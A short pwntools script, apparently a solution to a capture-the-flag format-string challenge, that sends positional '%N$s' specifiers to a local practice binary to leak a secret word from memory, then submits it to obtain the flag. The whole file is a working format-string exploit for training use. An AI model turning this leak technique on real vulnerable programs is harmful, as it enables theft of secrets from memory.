from pwn import *

for i in range(1,50):
    # open a local process
    p = process('./binaries/babyfmt_level1.0') # change path for level 1.1 (./binaries/babyfmt_level1.1)
    # receive until you get the input prompt
    p.recvuntil(b'Send your data!\n')
    try:
        p.sendline(f'%{i}$s\n')
        # receive the secret word and print it
        secret_word = (p.recvuntil(b'secret password?\n').decode('utf-8')).split()[11]
        # pass the secret word to the next input prompt to get the flag
        p.sendline(secret_word.strip())
        # check if the flag has 'Correct' in it
        response = p.recvall().decode('utf-8')
        if "Correct" in response:
            # print the flag
            print('Flag: \033[92m{}\033[0m'.format(response.split("\n")[1]))
    except:
        pass
